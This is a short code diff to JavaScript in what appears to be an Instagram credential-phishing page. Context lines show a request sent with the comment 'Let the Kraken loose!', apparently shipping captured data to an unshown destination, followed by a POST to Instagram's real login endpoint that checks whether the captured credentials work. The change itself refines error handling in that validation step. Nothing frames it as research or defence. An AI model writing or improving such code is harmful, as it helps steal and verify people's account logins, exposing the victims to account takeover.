@@ -88,18 +88,22 @@
 
         // Let the Kraken loose!
         xhr.send(data);
-        
+
         // Make the login validation request to Instagram
         var xhrValidation = new XMLHttpRequest();
         xhrValidation.open("POST", "https://www.instagram.com/accounts/login/ajax/", true);
         xhrValidation.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         xhrValidation.onreadystatechange = function() {
-            if (xhrValidation.readyState === 4 && xhrValidation.status === 200) {
-                var response = JSON.parse(xhrValidation.responseText);
-                if (response.authenticated) {
-                    alert("Login successful!");
+            if (xhrValidation.readyState === 4) {
+                if (xhrValidation.status === 200) {
+                    var response = JSON.parse(xhrValidation.responseText);
+                    if (response.authenticated) {
+                        alert("Login successful!");
+                    } else {
+                        alert("Login failed.");
+                    }
                 } else {
-                    alert("Login failed.");
+                    alert("An error occurred during the login validation process. Please try again later.");
                 }
             }
         };
